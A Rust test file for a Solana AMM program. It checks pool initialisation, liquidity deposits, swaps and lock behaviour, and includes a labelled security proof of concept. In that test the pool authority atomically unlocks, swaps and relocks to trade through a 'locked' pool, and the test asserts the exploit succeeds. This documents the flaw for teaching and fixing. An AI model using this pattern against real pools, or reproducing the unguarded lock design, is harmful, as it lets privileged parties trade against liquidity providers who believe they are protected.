mod common;

use amm::test_helpers::Pool;
use amm::{instruction as vix, SwapKind};
use anchor_litesvm::TestHelpers;
use common::{setup, MarkdownBlock, Report, Scenario};

// The constant product `k = reserve_x * reserve_y`. A swap may only grow it
// (by the fee), never shrink it.
fn pool_k(world: &Scenario, pool: &Pool) -> u128 {
    let x = world.ctx.svm.token_balance(&pool.vault_x).unwrap() as u128;
    let y = world.ctx.svm.token_balance(&pool.vault_y).unwrap() as u128;
    x * y
}

#[test]
fn pool_lifecycle_init_add_swap() {
    let mut md = Report::new(
        "AMM: initialize, add liquidity, and swap",
        "A pool opens at a 0.30% fee; Alice seeds it with X and Y; Bob swaps X for \
         Y. The invariant that matters: the constant product k = reserve_x * \
         reserve_y may only grow (by the fee), never shrink.",
    );
    let mut world = setup();

    // ANCHOR: init
    let (_admin, pool) = world.fresh_pool(30);
    md.step("Init: the pool opens at 0.30% fee, unlocked");
    md.block("config", world.observe_config(&pool));
    let config: amm::state::Config = world.ctx.load(&pool.config);
    md.check("fee_bps", 30u16, config.fee_bps);
    // ANCHOR_END: init

    // ANCHOR: addliq
    let alice = world.user("Alice", 10_000, 40_000);
    world.deposit(&alice, &pool, 1_000, 4_000, 1);
    md.step("Add liquidity: Alice deposits 1,000 X and 4,000 Y");
    md.snapshot("pool vaults", &world.observe_pool(&pool));
    md.check("vault X seeded", Some(1_000), world.ctx.svm.token_balance(&pool.vault_x));
    md.check("vault Y seeded", Some(4_000), world.ctx.svm.token_balance(&pool.vault_y));
    // ANCHOR_END: addliq

    // ANCHOR: swap
    let bob = world.user("Bob", 1_000, 0);
    let k_before = pool_k(&world, &pool);

    world
        .ctx
        .tx(&[&bob.signer])
        .build(
            amm::SwapBundle::from((&pool, &bob)),
            vix::Swap {
                kind: SwapKind::ExactInput { amount_in: 100, min_amount_out: 1 },
                a_to_b: true,
            },
        )
        .send_ok();

    md.step("Swap: Bob trades 100 X for Y; the constant product holds");
    md.snapshot("pool vaults", &world.observe_pool(&pool));
    let k_after = pool_k(&world, &pool);
    md.check("k must not shrink", true, k_after >= k_before);
    // ANCHOR_END: swap
}

#[test]
fn a_locked_pool_rejects_swaps() {
    let mut md = Report::new(
        "AMM: a locked pool rejects swaps",
        "The pool authority can freeze trading. After `set_locked(true)`, a swap \
         that would otherwise succeed is rejected with `PoolLocked`, and the \
         reserves are left untouched.",
    );
    let mut world = setup();
    let (admin, pool) = world.fresh_pool(30);
    let alice = world.user("Alice", 10_000, 40_000);
    world.deposit(&alice, &pool, 1_000, 4_000, 1);

    md.step("A funded, unlocked pool");
    md.snapshot("pool vaults", &world.observe_pool(&pool));

    // ANCHOR: locked
    // The authority freezes trading; the pool is now locked.
    world.set_locked(&admin, &pool, true);

    let bob = world.user("Bob", 1_000, 0);
    world
        .ctx
        .tx(&[&bob.signer])
        .build(
            amm::SwapBundle::from((&pool, &bob)),
            vix::Swap {
                kind: SwapKind::ExactInput { amount_in: 100, min_amount_out: 1 },
                a_to_b: true,
            },
        )
        .send_err_named("PoolLocked");
    // ANCHOR_END: locked

    md.step("After set_locked(true): the swap is rejected, reserves untouched");
    md.block("config", world.observe_config(&pool));
    md.snapshot("pool vaults", &world.observe_pool(&pool));
    let config: amm::state::Config = world.ctx.load(&pool.config);
    md.check("pool locked", true, config.locked);
}

// Security PoC (issue 001): a locked pool bounces honest swaps, but the
// authority can atomically unlock, swap, and relock in one transaction, trading
// through the lock no one else can cross. The test asserts the attack currently
// *succeeds*: that is the bug. The mitigation (a timelock on unlock) is planned,
// not landed; the captured tree is the teaching artifact.
#[test]
fn admin_trades_through_a_locked_pool() {
    let mut md = Report::new(
        "AMM: admin trades through a locked pool via an atomic unlock/swap/relock",
        "Users read `Config.locked == true` as \"the pool is paused; my position is \
         safe until the authority unlocks.\" That assumption is false: the authority \
         can pack unlock + their own swap + relock into ONE atomic transaction, so no \
         other user's tx can land in the window between unlock and relock. The admin \
         trades while honest traders bounce off `PoolLocked` on both sides. This test \
         passes, which is the bug (issue 001); the timelock mitigation is planned, not \
         landed.",
    );

    let mut world = setup();
    let (admin, pool) = world.fresh_pool(30);

    // Alice is the LP whose position the "locked" signal is supposed to protect.
    let alice = world.user("Alice", 1_000_000, 1_000_000);
    world.deposit(&alice, &pool, 1_000_000, 1_000_000, 1);

    // Promote the admin to a trader: fresh_pool already made their ATAs, so just
    // fund the X side.
    world.mint_to_x(&admin, 200_000);
    let bob = world.user("Bob", 100_000, 0);

    md.step("The authority locks the pool; honest Bob's swap now bounces with PoolLocked");
    world.set_locked(&admin, &pool, true);
    let bob_blocked = world
        .ctx
        .tx(&[&bob.signer])
        .build(
            amm::SwapBundle::from((&pool, &bob)),
            vix::Swap {
                kind: SwapKind::ExactInput { amount_in: 10_000, min_amount_out: 1 },
                a_to_b: true,
            },
        )
        .send_err_named("PoolLocked");
    md.block(
        "Bob blocked (pool locked)",
        MarkdownBlock::Fenced { lang: "console".into(), body: bob_blocked.logs_structured_string() },
    );

    // ANCHOR: attack
    // The Scenario verbs send one instruction per tx; the attack needs all three
    // in ONE atomic transaction, so drop to program().build_ix(...) and send
    // them together. The pool is locked; ix #1 unlocks it, ix #2 swaps while it's
    // open, ix #3 relocks, all before any other transaction can be sequenced.
    let unlock = world.ctx.program().build_ix(
        amm::SetLockedBundle { authority: admin.pubkey(), config: pool.config },
        vix::SetLocked { locked: false },
    );
    let swap = world.ctx.program().build_ix(
        amm::SwapBundle::from((&pool, &admin)),
        vix::Swap {
            kind: SwapKind::ExactInput { amount_in: 100_000, min_amount_out: 1 },
            a_to_b: true,
        },
    );
    let relock = world.ctx.program().build_ix(
        amm::SetLockedBundle { authority: admin.pubkey(), config: pool.config },
        vix::SetLocked { locked: true },
    );

    let attack = world.ctx.send_instructions(&[unlock, swap, relock], &[&admin.signer]);
    md.check("the atomic attack succeeds (this is the bug)", true, attack.is_success());
    // ANCHOR_END: attack

    md.step("The attack: unlock + admin swap + relock, in one atomic transaction");
    md.block(
        "the atomic attack transaction",
        MarkdownBlock::Fenced { lang: "console".into(), body: attack.logs_structured_string() },
    );

    md.step("Honest Bob is locked out again on the far side of the window");
    world
        .ctx
        .tx(&[&bob.signer])
        .build(
            amm::SwapBundle::from((&pool, &bob)),
            vix::Swap {
                kind: SwapKind::ExactInput { amount_in: 5_000, min_amount_out: 1 },
                a_to_b: true,
            },
        )
        .send_err_named("PoolLocked");
}
